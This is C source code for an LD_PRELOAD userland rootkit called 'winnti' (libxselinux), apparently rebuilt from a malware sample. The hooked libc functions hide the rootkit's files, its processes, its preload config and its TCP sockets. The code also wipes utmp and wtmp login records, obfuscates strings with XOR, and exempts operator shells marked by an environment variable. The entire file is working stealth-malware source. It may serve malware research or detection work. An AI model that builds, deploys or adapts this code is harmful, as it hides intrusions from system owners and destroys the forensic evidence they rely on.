#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <limits.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <pty.h>
#include <signal.h>
#include <utmp.h>
#include <dirent.h>

#include "crypthook.h"
#include "xor.h"
#include "const.h"
#include "winnti.h"

#ifdef __linux__
#if defined(__x86_64__) && defined(__GNU_LIBRARY__)
__asm__(".symver memcpy,memcpy@GLIBC_2.2.5");
void *__wrap_memcpy(void *dest, const void *src, size_t n)
{
    return memcpy(dest, src, n);
}
#else
void *__wrap_memcpy(void *dest, const void *src, size_t n)
{
    return memmove(dest, src, n);
}
#endif
#endif

void cleanup(void *var, int len)
{
    DEBUG("cleanup called %s\n", var);
    memset(var, 0x00, len);
    free(var);
}

// void x(char *p)
// {
//     int i, key = 0xFE;
//     for (i = 0; i < strlen(p); i++)
//         p[i] ^= key;
// }
void Decrypt2(char *p)
{
    char key = p[39];
    for (int i = 40; i < 264; i++)
    {
        p[i] = (char)i + key ^ p[i];
    }
    p[39] = 0;
}

int is_owner(void)
{
    init();
    if (owner != -1) // already set
        return owner;
    char *hide_term_str = strdup(HIDE_TERM_STR);
    x(hide_term_str); // "HIDE_THIS_SHELL"
    char *hide_term_var = getenv(hide_term_str);
    if (hide_term_var != NULL)
    {
        owner = 1;
    }
    else
    {
        owner = 0;
    }
    cleanup(hide_term_str, strlen(hide_term_str));
    return owner;
}
void clean_utmp(char *pts, int verbose)
{
    DEBUG("clean_utmp\n");
    struct utmp utmp_ent;
    char *utmp_file = strdup(UTMP_FILE_X);
    int fd;
    x(utmp_file);
    if ((fd = (long)syscall_list[SYS_OPEN].syscall_func(utmp_file, O_RDWR)) >= 0)
    {
        lseek(fd, 0, SEEK_SET);
        while (read(fd, &utmp_ent, sizeof(utmp_ent)) > 0)
        {
            if (!strncmp(utmp_ent.ut_line, pts, strlen(pts)))
            {
                memset(&utmp_ent, 0x00, sizeof(utmp_ent));
                lseek(fd, -(sizeof(utmp_ent)), SEEK_CUR);
                write(fd, &utmp_ent, sizeof(utmp_ent));
            }
        }
        close(fd);
    }
    if (verbose)
    {
        char *utmp_msg = strdup(UTMP_MSG);
        x(utmp_msg);
        printf("%s\n", utmp_msg);
        cleanup(utmp_msg, strlen(utmp_msg));
    }
    cleanup(utmp_file, strlen(utmp_file));
}

void clean_wtmp(char *pts, int verbose)
{
    DEBUG("clean_wtmp\n");
    struct utmp utmp_ent;
    char *wtmp_file = strdup(WTMP_FILE_X);
    int fd;
    x(wtmp_file);
    if ((fd = (long)syscall_list[SYS_OPEN].syscall_func(wtmp_file, O_RDWR)) >= 0)
    {
        lseek(fd, 0, SEEK_SET);
        while (read(fd, &utmp_ent, sizeof(utmp_ent)) > 0)
        {
            if (!strncmp(utmp_ent.ut_line, pts, strlen(pts)))
            {
                memset(&utmp_ent, 0x00, sizeof(utmp_ent));
                lseek(fd, -(sizeof(utmp_ent)), SEEK_CUR);
                write(fd, &utmp_ent, sizeof(utmp_ent));
            }
        }
        close(fd);
    }
    if (verbose)
    {
        char *wtmp_msg = strdup(WTMP_MSG);
        x(wtmp_msg);
        printf("%s\n", wtmp_msg);
        cleanup(wtmp_msg, strlen(wtmp_msg));
    }
    cleanup(wtmp_file, strlen(wtmp_file));
}

void winnti_init()
{
    DEBUG("[-] libxselinux.so loaded.\n");
    int i;
    if (constr) // if already constructed then return
        return;
    constr = 1;
    for (i = 0; i < SYSCALL_SIZE; i = i + 1)
    {
        char *scall = strdup(syscall_table[i]);
        x(scall);
        strncpy(syscall_list[i].syscall_name, scall, 50);
        syscall_list[i].syscall_func = dlsym(RTLD_NEXT, scall); // registering syscalls
        cleanup(scall, strlen(scall));
    }
}

void init(void)
{
    // char *hide_term_var = strdup(HIDE_TERM_VAR);
    // x(hide_term_var); // "HIDE_THIS_SHELL=please"

    char path[256];
    memset(path, 0x00, 256);

    winnti_init();                            // same as azazel_init
    realpath("/proc/self/exe", (char *)path); // Get the full path of the current process
    int flag = 1;
    int i;
    for (i = 0; i < procs_count; i++)
    {
        if (!strcmp(path, procs[i])) // matched
        {
            flag = 0;
            break;
        }
    }
    if (flag != 0) // entry of current process not found in procs array
    {
        owner = 1; // so don't hide the process
    }
    // free(hide_term_var);
}

int parse_environ(char *stack, int len, char *needle)
{
    DEBUG("parse_environ\n");
    char *step = stack;

    while (1)
    {
        if (strstr(step, needle))
            return 1;
        if (*step + 1 != '\0')
        {
            step++;
            if (step - stack >= len)
            {
                return 0;
            }
        }
        else
            return 0;
    }
}

int is_invisible(const char *path)
{
    DEBUG("is_invisible\n");
    struct stat s_fstat;
    char line[MAX_LEN];
    char p_path[PATH_MAX];
    char *config_file = strdup(CONFIG_FILE);
    FILE *cmd;

    init();
    x(config_file); // 'ld.so.preload'

    if (strstr(path, "libxselinux") ||
        ((strstr(path, "/sbin/ifup-local") && access("/var/run/libudev.pid", 0) != -1) ||
         strstr(path, config_file)))
    {
        cleanup(config_file, strlen(config_file));
        return 1;
    }

    char *proc_path = strdup(PROC_PATH); // '/proc/'
    x(proc_path);
    if (strstr(path, proc_path))
    {
        cleanup(proc_path, strlen(proc_path));
        if ((long)syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, &s_fstat) != -1)
        {
            // char *cmd_line = strdup(CMD_LINE);
            char *env_line = strdup(ENV_LINE);
            // x(cmd_line); // %s/cmdline
            x(env_line); // %s/environ
            snprintf(p_path, PATH_MAX, env_line, path);
            // cleanup(cmd_line, strlen(cmd_line));
            cleanup(env_line, strlen(env_line));

            // syscall_list._824_8_ -> syscall_list + 824 -> 64 x 12 + 56
            if ((long)(syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, p_path, &s_fstat)) != -1)
            {
                cmd = syscall_list[SYS_FOPEN].syscall_func(p_path, "r");
                if (cmd)
                {
                    char *hide_term_str = strdup(HIDE_TERM_STR);
                    x(hide_term_str);
                    int res;
                    while ((res = fgets(line, MAX_LEN, cmd) != NULL))
                    {
                        if (parse_environ(line, MAX_LEN, hide_term_str) == 1)
                        {
                            cleanup(config_file, strlen(config_file));
                            cleanup(hide_term_str, strlen(hide_term_str));
                            return 1;
                        }
                        memset(line, 0x00, MAX_LEN);
                    }
                    fclose(cmd);
                }
            }
        }
    }
    else
    {
        cleanup(proc_path, strlen(proc_path));
    }
    cleanup(config_file, strlen(config_file));
    return 0;
}

int is_procnet(const char *filename)
{
    DEBUG("is_procnet\n");
    char *proc_net_tcp = strdup(PROC_NET_TCP);
    char *proc_net_tcp6 = strdup(PROC_NET_TCP6);
    x(proc_net_tcp);
    x(proc_net_tcp6);

    if (strcmp(filename, proc_net_tcp) == 0 || strcmp(filename, proc_net_tcp6) == 0)
    {
        cleanup(proc_net_tcp, strlen(proc_net_tcp));
        cleanup(proc_net_tcp6, strlen(proc_net_tcp6));
        return 1;
    }

    cleanup(proc_net_tcp, strlen(proc_net_tcp));
    cleanup(proc_net_tcp6, strlen(proc_net_tcp6));
    return 0;
}

int check_if_number(char *number_str)
{
    int i = 0;
    for (i = 0; number_str[i] != '\0'; i++)
    {
        if (9 < number_str[i] - '0')
            return 0;
    }
    return 1;
}

void get_our_pids(void)
{
    long pid;
    int i;
    i = 0;
    DIR *proc_dir = syscall_list[SYS_OPENDIR].syscall_func("/proc/");
    while (1)
    {

        /*============FIND A PROCESS==============*/
        struct dirent *dir;
        do
        {
            dir = syscall_list[SYS_READDIR].syscall_func(proc_dir);
            if (dir == 0)
            {
                closedir(proc_dir);
                our_pids[i] = -1;
                return;
            }
        } while (!check_if_number(dir->d_name)); // loop until a process is found

        // then create path as "/proc/12345"
        // open the command line file of the process
        // /proc/%s/cmdline

        /*=========== OPEN /proc/[pid]/cmdline ============*/
        char fd_path[PATH_MAX];
        snprintf(fd_path, PATH_MAX, "/proc/%s/cmdline", dir->d_name);
        printf("%s\n", fd_path);
        FILE *file = syscall_list[SYS_FOPEN].syscall_func(fd_path, "rb");

        /*=========== INCLUDE THE PROCESS in our_pids ============*/
        char *line = NULL;
        size_t len = 0;
        if (file != NULL)
        {
            if (getdelim(&line, &len, '\0', file) != -1)
            {
                if (strcmp(line, "/lib/libxselinux") == 0 || strcmp(line, "/usr/lib/libxselinux") == 0)
                {
                    // process belongs to libxselinux
                    if (i < 1023)
                    {
                        int pid = atoi(dir->d_name);
                        our_pids[i] = pid;
                        i++;
                    }
                }
            }
        }
        if (line != NULL)
        {
            free(line);
        }
        if (file != NULL)
        {
            fclose(file);
        }
    }
}

void get_our_sockets(void)
{
    int inode;
    char fd_path[PATH_MAX];
    char fd_dir_path[PATH_MAX];
    char link[PATH_MAX];

    int j;
    int i;
    j = 0;
    get_our_pids();
    for (i = 0; our_pids[i] != -1; i++)
    {
        sprintf(fd_path, "/proc/%d/fd", our_pids[i]);
        DIR *proc_path = syscall_list[SYS_OPENDIR].syscall_func(fd_path);
        if (proc_path != 0)
        {
            struct dirent *dir;
            while (dir = syscall_list[SYS_READDIR].syscall_func(proc_path), dir != 0)
            {
                sprintf(fd_dir_path, "/proc/%d/fd/%s", our_pids[i], dir->d_name);
                int length = readlink(fd_dir_path, link, 0xfff);
                if (length != -1)
                {
                    link[length] = '\0';
                    if (sscanf(link, "socket:[%d]", &inode) == 1 && j < 1023)
                    {
                        our_sockets[j] = inode;
                        j++;
                    }
                }
            }
        }
    }
    our_sockets[j] = -1;
}

FILE *hide_ports(const char *filename)
{
    char line[LINE_MAX];
    char *proc_net_tcp = strdup(PROC_NET_TCP);
    char *proc_net_tcp6 = strdup(PROC_NET_TCP6);

    init();
    x(proc_net_tcp);
    x(proc_net_tcp6);

    unsigned long rxq, txq, time_len, retr, inode;
    int local_port, rem_port, d, state, uid, timer_run, timeout;
    char rem_addr[140], local_addr[128], more[512];

    get_our_sockets();
    FILE *tmp = tmpfile();
    FILE *pnt = syscall_list[SYS_FOPEN].syscall_func(filename, "r");

    while (fgets(line, LINE_MAX, pnt) != NULL)
    {
        char *scanf_line = strdup(SCANF_LINE);
        x(scanf_line);
        sscanf(line, scanf_line, &d, local_addr, &local_port, rem_addr, &rem_port, &state, &txq,
               &rxq, &timer_run, &time_len, &retr, &uid, &timeout, &inode, more);
        cleanup(scanf_line, strlen(scanf_line));

        int j;
        int flag = 0;
        for (j = 0; our_sockets[j] != -1; j++)
        {
            if (our_sockets[j] == inode)
            {
                flag = 1;
                break;
            }
        }
        if (flag == 0)
        {
            fputs(line, tmp);
        }
    }

    cleanup(proc_net_tcp, strlen(proc_net_tcp));
    cleanup(proc_net_tcp6, strlen(proc_net_tcp6));
    fclose(pnt);
    fseek(tmp, 0, SEEK_SET);
    return tmp;
}

int access(const char *path, int amode)
{
    DEBUG("access hooked.\n");
    if (is_owner())
        return (long)syscall_list[SYS_ACCESS].syscall_func(path, amode);

    if (is_invisible(path))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_ACCESS].syscall_func(path, amode);
}
FILE *fopen64(const char *filename, const char *mode)
{
    DEBUG("fopen hooked %s.\n", filename);
    if (is_owner())
    {
        return syscall_list[SYS_FOPEN64].syscall_func(filename, mode);
    }
    if (is_procnet(filename))
    {
        return hide_ports(filename);
    }
    if (is_invisible(filename))
    {
        errno = ENOENT; // ENOENT - No such file or directory
        return NULL;
    }
    return syscall_list[SYS_FOPEN64].syscall_func(filename, mode);
}

int lstat(const char *file, struct stat *buf)
{
    DEBUG("lstat hooked.\n");
    if (is_owner())
        return (long)syscall_list[SYS_LXSTAT].syscall_func(_STAT_VER, file, buf);

    if (is_invisible(file))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_LXSTAT].syscall_func(_STAT_VER, file, buf);
}

int lstat64(const char *file, struct stat64 *buf)
{
    DEBUG("lstat64 hooked.\n");
    if (is_owner())
        return (long)syscall_list[SYS_LXSTAT64].syscall_func(_STAT_VER, file, buf);

    if (is_invisible(file))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_LXSTAT64].syscall_func(_STAT_VER, file, buf);
}

int x__lxstat(int ver, const char *file, struct stat *buf)
{
    DEBUG("__lxstat hooked.\n");
    if (is_owner())
        return (long)syscall_list[SYS_LXSTAT].syscall_func(ver, file, buf);

    if (is_invisible(file))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_LXSTAT].syscall_func(ver, file, buf);
}

int __lxstat64(int ver, const char *file, struct stat64 *buf)
{
    DEBUG("__lxstat64 hooked.\n");
    if (is_owner())
        return (long)syscall_list[SYS_LXSTAT64].syscall_func(ver, file, buf);

    if (is_invisible(file))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_LXSTAT64].syscall_func(ver, file, buf);
}

int open(const char *pathname, int flags, mode_t mode)
{
    DEBUG("open hooked.\n");
    if (is_owner())
        return (long)syscall_list[SYS_OPEN].syscall_func(pathname, flags, mode);

    if (is_invisible(pathname))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_OPEN].syscall_func(pathname, flags, mode);
}

int rmdir(const char *pathname)
{
    DEBUG("rmdir hooked.\n");
    if (is_owner())
        return (long)syscall_list[SYS_RMDIR].syscall_func(pathname);

    if (is_invisible(pathname))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_RMDIR].syscall_func(pathname);
}

int stat(const char *path, struct stat *buf)
{
    DEBUG("stat hooked\n");
    if (is_owner())
        return (long)syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, buf);

    if (is_invisible(path))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, buf);
}

int stat64(const char *path, struct stat64 *buf)
{
    DEBUG("stat64 hooked.\n");
    if (is_owner())
        return (long)syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, buf);

    if (is_invisible(path))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_XSTAT64].syscall_func(_STAT_VER, path, buf);
}

int x__xstat(int ver, const char *path, struct stat *buf)
{
    DEBUG("xstat hooked. path: %s\n", path);
    if (is_owner())
        return (long)syscall_list[SYS_XSTAT].syscall_func(ver, path, buf);

    if (is_invisible(path))
    {
        DEBUG("File is invisble.\n");
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_XSTAT].syscall_func(ver, path, buf);
}

int __xstat64(int ver, const char *path, struct stat64 *buf)
{
    DEBUG("xstat64 hooked.\n");
    if (is_owner())
        return (long)syscall_list[SYS_XSTAT64].syscall_func(ver, path, buf);

    if (is_invisible(path))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_XSTAT64].syscall_func(ver, path, buf);
}

int unlink(const char *pathname)
{
    DEBUG("unlink hooked.\n");
    if (is_owner())
        return (long)syscall_list[SYS_UNLINK].syscall_func(pathname);

    if (is_invisible(pathname))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_UNLINK].syscall_func(pathname);
}

int unlinkat(int dirfd, const char *pathname, int flags)
{
    DEBUG("unlinkat hooked.\n");
    if (is_owner())
        return (long)syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);

    if (is_invisible(pathname))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_UNLINKAT].syscall_func(dirfd, pathname, flags);
}

DIR *opendir(const char *name)
{
    DEBUG("opendir hooked.\n");
    if (is_owner())
        return syscall_list[SYS_OPENDIR].syscall_func(name);

    if (is_invisible(name))
    {
        errno = ENOENT;
        return NULL;
    }

    return syscall_list[SYS_OPENDIR].syscall_func(name);
}

struct dirent *readdir(DIR *dirp)
{
    DEBUG("readdir hooked.\n");
    if (is_owner())
        return syscall_list[SYS_READDIR].syscall_func(dirp);
    struct dirent *dir;
    do
    {
        dir = syscall_list[SYS_READDIR].syscall_func(dirp);

        if (dir != NULL && (strcmp(dir->d_name, ".\0") || strcmp(dir->d_name, "/\0")))
            continue;

        if (dir != NULL)
        {
            char path[PATH_MAX + 1];
            char *proc_str = strdup(PROC_STR);
            x(proc_str);
            snprintf(path, PATH_MAX, proc_str, dir->d_name);
            cleanup(proc_str, strlen(proc_str));

            if (is_invisible(path) || strstr(path, MAGIC_STRING))
            {
                continue;
            }
        }

    } while (dir && is_invisible(dir->d_name));

    return dir;
}

struct dirent64 *readdir64(DIR *dirp)
{
    DEBUG("readdir64 hooked.\n");
    if (is_owner())
        return syscall_list[SYS_READDIR64].syscall_func(dirp);
    struct dirent64 *dir;
    do
    {
        dir = syscall_list[SYS_READDIR64].syscall_func(dirp);

        if (dir != NULL && (strcmp(dir->d_name, ".\0") || strcmp(dir->d_name, "/\0")))
            continue;

        if (dir != NULL)
        {
            char path[PATH_MAX + 1];
            char *proc_str = strdup(PROC_STR);
            x(proc_str);
            snprintf(path, PATH_MAX, proc_str, dir->d_name);
            cleanup(proc_str, strlen(proc_str));

            if (is_invisible(path) || strstr(path, MAGIC_STRING))
            {
                continue;
            }
        }

    } while (dir && is_invisible(dir->d_name));
    return dir;
}

int link(const char *oldpath, const char *newpath)
{
    DEBUG("link hooked.\n");
    if (is_owner())
        return (long)syscall_list[SYS_LINK].syscall_func(oldpath, newpath);

    if (is_invisible(oldpath))
    {
        errno = ENOENT;
        return -1;
    }

    return (long)syscall_list[SYS_LINK].syscall_func(oldpath, newpath);
}

// void *(*original_memcpy)() = NULL;
// void *__wrap_memcpy(void *to, const void *from, size_t numBytes)
// {
//     long lVar1;
//     if (original_memcpy == NULL)
//     {
//         lVar1 = dlopen("libc.so.6", 2);
//         if (lVar1 != 0)
//         {
//             void *(*original_memcpy)() = dlsym(lVar1, "memcpy");
//             dlclose(lVar1);
//         }
//     }
//     if (original_memcpy == NULL)
//     {
//         return NULL;
//     }
//     else
//     {
//         return original_memcpy(to, from, numBytes);
//     }
// }

int check_is_our_proc_dir(const char *filename)
{
    int is_our;
    is_our = 0;

    if (strstr(filename, "/proc/") == filename &&
        strchr(&filename[6], '/') != NULL)
    {
        // Format: /proc/[pid]/*/*/....
        char *second_slash = strchr(&filename[6], '/');
        char fd_path[PATH_MAX];
        strncpy(fd_path, filename, second_slash - filename);
        fd_path[second_slash - filename] = '\0'; // Ensure null termination
        strcat(fd_path, "/cmdline");

        FILE *file = syscall_list[SYS_FOPEN].syscall_func(fd_path, "rb");

        char *line = NULL;
        size_t len = 0;
        if (file != NULL)
        {
            // Format: /proc/[pid]/cmdline
            if (getdelim(&line, &len, '\0', file) != -1)
            {
                if (strcmp(line, "/lib/libxselinux") == 0 || strcmp(line, "/usr/lib/libxselinux") == 0)
                {
                    is_our = 1;
                }
            }
        }
        if (line != NULL)
        {
            free(line);
        }
        if (file != NULL)
        {
            fclose(file);
        }
    }
    else
    {
        is_our = 0;
    }
    return is_our;
}

FILE *fopen(const char *filename, const char *mode)
{
    DEBUG("fopen hooked %s.\n", filename);
    if (is_owner())
    {
        return syscall_list[SYS_FOPEN].syscall_func(filename, mode);
    }
    else
    {
        if (is_procnet(filename))
        {
            return hide_ports(filename);
        }
        else
        {
            if (is_invisible(filename))
            {
                errno = ENOENT;
                return NULL;
            }
            else
            {
                // check if included in our_pids
                if (check_is_our_proc_dir(filename) == 0)
                {
                    return syscall_list[SYS_FOPEN64].syscall_func(filename, mode);
                }
                else
                {
                    errno = ENOENT;
                    return NULL;
                }
            }
        }
    }
}

int is_invisible_with_pids(const char *path)
{
    DEBUG("is_invisible_with_pids\n");
    struct stat s_fstat;
    char line[MAX_LEN];
    char p_path[PATH_MAX];
    char *config_file = strdup(CONFIG_FILE);
    FILE *cmd;

    init();
    x(config_file); // '/proc/'
    if ((strstr(path, "libxselinux") == NULL) &&
        (((strstr(path, "/sbin/ifup-local") == NULL ||
           (access("/var/run/libudev.pid", 0) == -1)) &&
          (strstr(path, config_file) == NULL))))
    {
        // Difference with is_invisible
        int i;
        for (i = 0; our_pids[i] != -1; i++)
        {
            snprintf(p_path, PATH_MAX, "/proc/%d", our_pids[i]);
            if (strstr(path, p_path) != NULL)
            {
                return 1; // return 1 if path contains our_pids
            }
        }
        // ============================

        char *proc_path = strdup(PROC_PATH);
        x(proc_path);

        if (strstr(path, proc_path))
        {
            cleanup(proc_path, strlen(proc_path));
            if ((long)syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, path, &s_fstat) != -1)
            {
                char *cmd_line = strdup(CMD_LINE);
                char *env_line = strdup(ENV_LINE);
                x(cmd_line); // %s/cmdline
                x(env_line); // %s/environ
                snprintf(p_path, PATH_MAX, env_line, path);
                cleanup(cmd_line, strlen(cmd_line));
                cleanup(env_line, strlen(env_line));

                if ((long)(syscall_list[SYS_XSTAT].syscall_func(_STAT_VER, p_path, &s_fstat)) != -1)
                {
                    cmd = syscall_list[SYS_FOPEN].syscall_func(p_path, "r");
                    if (cmd)
                    {
                        char *hide_term_str = strdup(HIDE_TERM_STR);
                        x(hide_term_str);
                        int res;
                        while ((res = fgets(line, MAX_LEN, cmd) != NULL))
                        {
                            if (parse_environ(line, MAX_LEN, hide_term_str) == 1)
                            {
                                cleanup(config_file, strlen(config_file));
                                cleanup(hide_term_str, strlen(hide_term_str));
                                return 1;
                            }
                            memset(line, 0x00, MAX_LEN);
                        }
                        fclose(cmd);
                    }
                }
            }
        }
        else
        {
            cleanup(proc_path, strlen(proc_path));
        }
        cleanup(config_file, strlen(config_file));
        return 0;
    }
    else
    {
        cleanup(config_file, strlen(config_file));
        return 1;
    }
}
